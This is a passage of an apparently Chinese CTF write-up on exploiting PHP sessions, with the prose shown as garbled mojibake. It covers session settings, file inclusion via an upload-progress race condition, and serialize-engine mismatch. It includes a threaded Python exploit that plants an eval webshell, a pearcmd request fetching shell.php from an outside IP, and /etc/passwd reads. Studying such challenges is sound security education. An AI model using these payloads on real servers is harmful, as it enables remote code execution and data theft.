&lt;hr>
&lt;h2 id="sessioné…ç½®ç®€è¿°">sessioné…ç½®&amp;amp;ç®€è¿°&lt;/h2>
&lt;p>ä»¥7.4.3ä¸ºä¾‹ï¼Œphp.iniä¸­å…³äºŽSessionæœ‰å‡ ä¸ªé»˜è®¤é¡¹&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>session.auto_start = 0&lt;/code>ï¼šé»˜è®¤ä¸å¯åŠ¨sessionï¼Œ*ä½†æ˜¯å¯ä»¥åœ¨phpè„šæœ¬ä¸­æ‰‹åŠ¨æ‰§è¡Œ&lt;code>session_start()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_handler = files&lt;/code>ï¼šsessionä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.save_path=&amp;quot;&amp;quot;&lt;/code>ï¼šsessionæ–‡ä»¶å­˜å‚¨è·¯å¾„ æ–‡ä»¶åä¸º&lt;code>sess_PHPSESSID&lt;/code>&lt;/p>
&lt;p>linuxä¸‹é»˜è®¤å­˜å‚¨ä½ç½®ï¼›*å¯ä»¥è¢«ä¿®æ”¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php5/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>&lt;code>session.serialize_handler = php&lt;/code>ï¼šsessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“Žæ˜¯php&lt;/p>
&lt;p>å…¶å®žä¸€å…±æœ‰3ç§ï¼Œ*phpå’Œphp_serializeè¿™ä¸¤ç§æ˜¯å¾ˆå¤šé¢˜çš„å…ƒå‡¶&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>åºåˆ—åŒ–å¼•æ“Ž&lt;/th>
&lt;th>å­˜å‚¨æ–¹å¼&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>php&lt;/td>
&lt;td>é”®å|åºåˆ—åŒ–åŽå­—ç¬¦ä¸²&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_binary&lt;/td>
&lt;td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ï¼ˆä¼šæœ‰ä¸å¯æ˜¾ç¤ºçš„å­—ç¬¦ï¼‰+é”®å+ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>php_serialize(php&amp;gt;=5.5.4)&lt;/td>
&lt;td>å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–å¤„ç†å¾—åˆ°çš„æ•°ç»„&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.enabled = On&lt;/code>ï¼šå½“æœ‰POSTä¸Šä¼ è¡Œä¸ºæ—¶ï¼Œæ­¤æ¬¡ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰ï¼‰éƒ½ä¼šè¢«å­˜å‚¨åˆ°sessionä¸­&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼šå½“POSTä¸Šä¼ å®ŒæˆåŽï¼Œæ­¤æ¬¡çš„sessionæ–‡ä»¶å†…å®¹ä¼šè¢«ç«‹å³æƒ…å†µ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.prefix = &amp;quot;upload_progress_&amp;quot;&lt;/code>ï¼šå­˜å…¥sessionæ–‡ä»¶ä¸­çš„å‰ç¼€éƒ¨åˆ†&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.upload_progress.name = &amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot;&lt;/code>ï¼šé»˜è®¤nameï¼Œ*å¯æŽ§å¯åˆ©ç”¨&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>session.use_strict_mode = 0&lt;/code>ï¼šè¡¨ç¤ºæˆ‘ä»¬å¯¹Cookieä¸­çš„PHPSESSIDå­—æ®µå¯æŽ§&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="æ–‡ä»¶åŒ…å«æ¡ä»¶ç«žäº‰">æ–‡ä»¶åŒ…å«&amp;amp;æ¡ä»¶ç«žäº‰&lt;/h2>
&lt;p>é»˜è®¤æƒ…å†µä¸‹&lt;code>session.use_strict_mode = 0&lt;/code>ï¼Œå½“æˆ‘ä»¬è®¾ç½®äº†Cookieçš„&lt;code>PHPSESSID&lt;/code>å­—æ®µåŽçš„å€¼valueåŽï¼Œphpä¼šè‡ªåŠ¨åˆ›å»ºsessionæ–‡ä»¶ï¼ˆé»˜è®¤è·¯å¾„&lt;code>/tmp/sess_PHPSESSID&lt;/code>ï¼‰ï¼›æ³¨æ„è¿™ä¸ªè¡Œä¸ºå¹¶ä¸éœ€è¦&lt;code>session.auto_start = On&lt;/code>æˆ–æ˜¯&lt;code>session_start()&lt;/code>æ¥æ‰‹åŠ¨å¼€å¯å°±ä¼šè¢«PHPè‡ªåŠ¨åˆå§‹åŒ–ä¸€ä¸ªsessionï¼Œå¹¶å°†prefix+valueå†™å…¥sess_PHPSESSIDæ–‡ä»¶ä¸­ï¼›æ•´ä¸ªæµç¨‹ä¸­valueå¯æŽ§ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„çš„payloadåŠ è½½åˆ°sessæ–‡ä»¶ä¸­ç„¶åŽåŒ…å«ï¼Œå¾—åˆ°rce&lt;/p>
&lt;p>è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„ä¸Šä¼ è¡¨å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#75af00">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.php&amp;#34;&lt;/span> &lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span> &lt;span style="color:#75af00">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;hidden&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;PHP_SESSION_UPLOAD_PROGRESS&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;666666&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“ç„¶ä¸€èˆ¬çš„é¢˜ä¸ä¼šæœ‰è¿™ä¹ˆå•çº¯ï¼Œè¿˜ä¼šé…ä¸€ä¸ªé»˜è®¤é¡¹&lt;code>session.upload_progress.cleanup = On&lt;/code>ï¼›ä½†æ˜¯å¦‚æžœæˆ‘ä»¬æž„é€ ä¸Šä¼ è¡¨å•æ—¶ä¼ çš„æ— ç”¨æ–‡ä»¶å¾ˆå¤§æ—¶å°±å¯ä»¥æ¥ä¸ªé¡¶çº§æ‹‰æ‰¯ï¼ˆæ¡ä»¶ç«žäº‰ï¼‰ï¼Œåœ¨å®ƒè¢«æ¸…ç©ºå‰å…ˆåŒ…å«&amp;amp;rce&lt;/p>
&lt;h3 id="wmctf2020make-php-great-again">[WMCTF2020]Make PHP Great Again&lt;/h3>
&lt;p>å¼€å¹•æºç æš´å‡»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªé¢˜çš„éžé¢„æœŸè§£ï¼šæ–‡ä»¶åŒ…å«+æ¡ä»¶ç«žäº‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#111">sessid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;AMIZ&amp;#39;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;system(&amp;#39;tac /var/www/html/flag.php&amp;#39;);&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">50&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHP_SESSION_UPLOAD_PROGRESS&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_POST[&amp;#34;cmd&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">)},&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;PHPSESSID&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://d5ef2f36-5be3-46d5-8c04-301b9ba4f5f7.node4.buuoj.cn:81/?file=/tmp/sess_&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sessid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;amiz.txt&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">clear&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Event&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">30&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">event&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hxb-2021easywill">[HXB 2021]easywill&lt;/h3>
&lt;p>willphp v2.1.5ï¼Œæ˜¯åŸºäºŽtpçš„æ¡†æž¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">home\controller&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">IndexController&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()å¯ä»¥æŽ§åˆ¶nameå’Œvalueå‚æ•°ï¼Œè€Œç´§è·Ÿç€çš„viewå‡½æ•°æœ‰ç‚¹ä¸œè¥¿&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æœ€åŽçš„49è¡Œæœ‰æ–‡ä»¶å†™å…¥çš„ç‚¹ï¼Œ51è¡Œæœ‰ä¸ª&lt;code>extract()&lt;/code>å¯ä»¥åšåˆ°å˜é‡è¦†ç›–ï¼Œé‚£æˆ‘ä»¬å°±æŠŠfile_put_contentsçš„å‚æ•°æ¢æˆè‡ªå·±æƒ³è¦çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥æ­£å¸¸å›žæ˜¾&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
&lt;p>ä¸è¿‡flagæ–‡ä»¶çš„åå­—å¹¶ä¸æ˜¯flagï¼Œæˆ‘ä»¬å¯ä»¥ç”¨pearcmdå†™shellçš„æ–¹æ³•æ¥ä¸ªwebshellï¼ˆè¯¦ç»†çš„å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™è¿‡çš„å¦ä¸€ä¸ªé¢˜-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[å¼ºç½‘æ‹Ÿæ€ 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>ä¸è¿‡è¿™é‡Œè¦æ³¨æ„shellçš„å†™æ³•ï¼Œå¸¸è§„çš„&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>è¿™æ ·çš„æ˜¯ä¸è¡Œçš„ï¼Œä¸‹è½½å°±ä¼šæŠ¥é”™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>æ‰§è¡Œä¹Ÿä¼šæŠ¥é”™ï¼Œè¿™é‡Œçš„shellè¦è¿™æ ·å†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>ä¹‹åŽç›´æŽ¥æŠŠvalueçš„å€¼æ¢æˆflagæ–‡ä»¶åå³å¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>â€”â€”â€”â€”ä¸è¿‡è¿™é‡Œæˆ‘ç›´æŽ¥å†™ðŸŽä¸€ç›´æˆåŠŸä¸äº†ï¼Œåªèƒ½è¿œç¨‹åŒ…å«ðŸŽ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>â€”â€”â€”â€”è¯¶ï¼Œè¯´äº†åŠå¤©ï¼Œå…¶å®žå’Œæœ¬ç¯‡æœ‰å…³çš„åœ¨éžé¢„æœŸçš„ç‚¹ï¼Œå’Œä¸Šé¢çš„è„šæœ¬å‡ ä¹Žä¸€æ ·ï¼Œè¦æ”¹çš„åœ°æ–¹åœ¨äºŽreadéƒ¨åˆ†çš„urläº†&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_'+sessid
&lt;/code>&lt;/pre>&lt;h2 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–&lt;/h2>
&lt;p>è¿™é‡Œè¯¦ç»†çš„è®²è§£å¯ä»¥å‚ç…§&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶&lt;/a>ï¼Œå°±ä¸åšå¤åˆ¶ç²˜è´´å·¥ç¨‹å¸ˆäº†ï¼Œç”¨è‡ªå·±çš„è¯è®²å‡ ä¸ªé‡Œé¢å·²ç»æè¿‡çš„ç‚¹å§&lt;/p>
&lt;p>é¦–å…ˆï¼Œè¿™é‡Œçš„é—®é¢˜ï¼ˆæˆ‘ä»¬å¯ä»¥æ”»å‡»çš„åŽŸå› ï¼‰å‡ºçŽ°åœ¨ä¸¤ç§åºåˆ—åŒ–å¼•æ“Žæ··ç”¨çš„æƒ…å†µä¸‹ï¼Œå½“æäº¤&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;quot;stdClass&amp;quot;:0:{}
&lt;/code>&lt;/pre>&lt;p>æ—¶ï¼Œ&lt;code>php_serialize&lt;/code>æ–¹å¼ä¸‹ä¼šè¢«å­˜å‚¨ä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;|O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯è¢«&lt;code>php&lt;/code>æ–¹å¼åˆ™ä¼šè§£æžä¸º&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;quot;a&amp;quot;;s:20:&amp;quot;=O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>åœ¨å…·ä½“åº”ç”¨æ—¶ï¼Œå¯æŽ§çš„ç‚¹é™¤äº†get/postçš„å‚æ•°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æŽ¥ç€æž„é€ æ–‡ä»¶ä¸Šä¼ çš„è¡¨å•ï¼Œé™¤äº†&lt;code>PHPSESSID&lt;/code>ä¹‹å¤–çš„åºŸç‰©æ–‡ä»¶çš„æ–‡ä»¶åå°±å¯ä»¥å½“æ­¤å¤§ä»»ï¼Œè®°å¾—åºåˆ—åŒ–å­—ç¬¦å‰é¢è¦åŠ ä¸Š&lt;code>|&lt;/code>ï¼Œå†…éƒ¨çš„åŒå¼•å·è¦ç”¨&lt;code>\&lt;/code>è¿›è¡Œè½¬ä¹‰&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>è¿™ä¸ªé¢˜å¾—å®¡&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">æºç &lt;/a>&lt;/p>
